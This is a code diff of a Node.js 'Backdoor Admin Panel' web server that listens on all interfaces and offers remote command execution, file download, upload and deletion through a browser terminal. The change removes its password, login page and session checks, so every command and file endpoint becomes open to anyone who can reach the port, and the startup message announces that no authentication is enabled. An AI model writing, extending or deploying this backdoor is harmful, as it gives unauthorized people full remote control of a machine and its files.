@@ -11,18 +11,14 @@ const __dirname = dirname(__filename);
 
 const PORT = process.argv[2] || process.env.BACKDOOR_PORT || 8080;
 const HOST = '0.0.0.0'; // Bind to all interfaces for remote access
-const PASSWORD = process.argv[3] || process.env.BACKDOOR_PASSWORD || 'beemovierocks'; // Simple auth; change this!
 let currentDir = process.cwd();
-
-// Simple in-memory sessions (not secure; for demo)
-const sessions = new Map();
 
 // Client-side path join helper
 function clientPathJoin(dir, name) {
   return dir.endsWith('/') ? `${dir}${name}` : `${dir}/${name}`;
 }
 
-// HTML template for main page (embedded for self-contained)
+// HTML template for main page (embedded for self-contained, no login)
 const MAIN_HTML = `
 <!DOCTYPE html>
 <html lang="en">
@@ -43,21 +39,15 @@ const MAIN_HTML = `
         .dir { color: #4af; }
         .file-link { color: #afa; text-decoration: none; }
         .file-link:hover { text-decoration: underline; }
-        #login { text-align: center; }
     </style>
 </head>
 <body>
-    <div id="login" style="display: block;">
-        <h2>Login</h2>
-        <input type="password" id="pass" placeholder="Password">
-        <button onclick="login()">Login</button>
-    </div>
-    <div id="main" style="display: none;">
+    <div id="main" style="display: block;">
         <h1>Backdoor Admin Panel</h1>
         <button onclick="showTab('terminal')">Terminal</button>
         <button onclick="showTab('files')">Files</button>
        
-        <div id="terminal" class="tab">
+        <div id="terminal" class="tab active">
             <h2>Interactive Terminal</h2>
             <div id="output"></div>
             <input type="text" id="cmd" placeholder="Enter command..." onkeypress="if(event.key==='Enter') runCmd()">
@@ -75,30 +65,8 @@ const MAIN_HTML = `
         </div>
     </div>
     <script>
-        let sessionId = null;
+        // No session needed
         
-        function login() {
-            const pass = document.getElementById('pass').value;
-            fetch('/login', { 
-                method: 'POST', 
-                headers: {'Content-Type': 'application/json'}, 
-                body: JSON.stringify({pass}) 
-            })
-            .then(r => r.json())
-            .then(data => {
-                if (data.success) {
-                    sessionId = data.session;
-                    document.getElementById('login').style.display = 'none';
-                    document.getElementById('main').style.display = 'block';
-                    showTab('terminal');
-                    // Don't call updateFiles here; let user switch to files tab
-                } else {
-                    alert('Invalid password');
-                }
-            })
-            .catch(err => console.error('Login error:', err));
-        }
-       
         function showTab(tab) {
             document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
             document.getElementById(tab).classList.add('active');
@@ -112,11 +80,8 @@ const MAIN_HTML = `
             out.innerHTML += '> ' + cmd + '\\n';
             fetch('/cmd', { 
                 method: 'POST', 
-                headers: {
-                    'Content-Type': 'application/json',
-                    'session': sessionId
-                }, 
-                body: JSON.stringify({cmd, session: sessionId}) 
+                headers: {'Content-Type': 'application/json'}, 
+                body: JSON.stringify({cmd}) 
             })
             .then(r => r.text())
             .then(data => {
@@ -131,8 +96,7 @@ const MAIN_HTML = `
         }
        
         function updateFiles() {
-            if (!sessionId) return;
-            fetch('/files', { headers: {'session': sessionId} })
+            fetch('/files')
             .then(r => r.json())
             .then(data => {
                 document.getElementById('currDir').textContent = data.cwd;
@@ -145,7 +109,7 @@ const MAIN_HTML = `
                         div.innerHTML = '<span class="dir">📁</span> <a href="#" onclick="cd(\\'\\' + f.name + '\\')" class="file-link">' + f.name + '</a>';
                     } else {
                         const fullPath = clientPathJoin(data.cwd, f.name);
-                        div.innerHTML = '<span>📄</span> <a href="/download?file=' + encodeURIComponent(fullPath) + '&session=' + sessionId + '" class="file-link">' + f.name + '</a> <button onclick="rm(\\'\\' + f.name + '\\')">Delete</button>';
+                        div.innerHTML = '<span>📄</span> <a href="/download?file=' + encodeURIComponent(fullPath) + '" class="file-link">' + f.name + '</a> <button onclick="rm(\\'\\' + f.name + '\\')">Delete</button>';
                     }
                     list.appendChild(div);
                 });
@@ -156,11 +120,8 @@ const MAIN_HTML = `
         function cd(dir) {
             fetch('/cd', { 
                 method: 'POST', 
-                headers: {
-                    'Content-Type': 'application/json',
-                    'session': sessionId
-                },
-                body: JSON.stringify({dir, session: sessionId}) 
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({dir}) 
             })
             .then(() => updateFiles());
         }
@@ -170,11 +131,8 @@ const MAIN_HTML = `
             if (!name) return;
             fetch('/mkdir', { 
                 method: 'POST', 
-                headers: {
-                    'Content-Type': 'application/json',
-                    'session': sessionId
-                },
-                body: JSON.stringify({name, session: sessionId}) 
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({name}) 
             })
             .then(() => { 
                 updateFiles(); 
@@ -187,11 +145,9 @@ const MAIN_HTML = `
             if (input.files.length === 0) return;
             const formData = new FormData();
             Array.from(input.files).forEach(file => formData.append('files', file));
-            formData.append('session', sessionId);
             fetch('/upload', { 
                 method: 'POST', 
-                body: formData,
-                headers: {'session': sessionId}
+                body: formData
             })
             .then(r => r.text())
             .then(() => { 
@@ -205,11 +161,8 @@ const MAIN_HTML = `
             if (!confirm('Delete ' + file + '?')) return;
             fetch('/rm', { 
                 method: 'POST', 
-                headers: {
-                    'Content-Type': 'application/json',
-                    'session': sessionId
-                },
-                body: JSON.stringify({file, session: sessionId}) 
+                headers: {'Content-Type': 'application/json'},
+                body: JSON.stringify({file}) 
             })
             .then(() => updateFiles());
         }
@@ -218,52 +171,19 @@ const MAIN_HTML = `
         function clientPathJoin(p1, p2) { 
             return p1.endsWith('/') ? p1 + p2 : p1 + '/' + p2; 
         }
+        
+        // Auto-load files on start if needed, but terminal is default
     </script>
 </body>
 </html>`;
 
-// Create server
+// Create server (no auth checks)
 const server = http.createServer((req, res) => {
     const urlObj = new URL(req.url, `http://${req.headers.host}`);
-    let sessionId = req.headers.session || urlObj.searchParams.get('session');
-    let isValidSession = false;
-    if (sessionId) {
-        isValidSession = sessions.has(sessionId);
-    }
    
     if (req.url === '/' && req.method === 'GET') {
         res.writeHead(200, { 'Content-Type': 'text/html' });
         res.end(MAIN_HTML);
-        return;
-    }
-   
-    if (req.url === '/login' && req.method === 'POST') {
-        let body = '';
-        req.on('data', chunk => body += chunk);
-        req.on('end', () => {
-            try {
-                const { pass } = JSON.parse(body);
-                if (pass === PASSWORD) {
-                    const newSession = Math.random().toString(36).substring(7);
-                    sessions.set(newSession, true);
-                    res.writeHead(200, { 'Content-Type': 'application/json' });
-                    res.end(JSON.stringify({ success: true, session: newSession }));
-                } else {
-                    res.writeHead(401, { 'Content-Type': 'application/json' });
-                    res.end(JSON.stringify({ success: false }));
-                }
-            } catch (e) {
-                res.writeHead(400);
-                res.end('Bad request');
-            }
-        });
-        return;
-    }
-   
-    // Middleware: check session for all other routes
-    if (!isValidSession) {
-        res.writeHead(401);
-        res.end('Unauthorized');
         return;
     }
    
@@ -393,7 +313,7 @@ const server = http.createServer((req, res) => {
 
 server.listen(PORT, HOST, () => {
     console.log(`Backdoor web server running at http://${HOST}:${PORT}`);
-    console.log(`Password: ${PASSWORD}`);
+    console.log('No authentication enabled.');
 });
 
 // Graceful shutdown
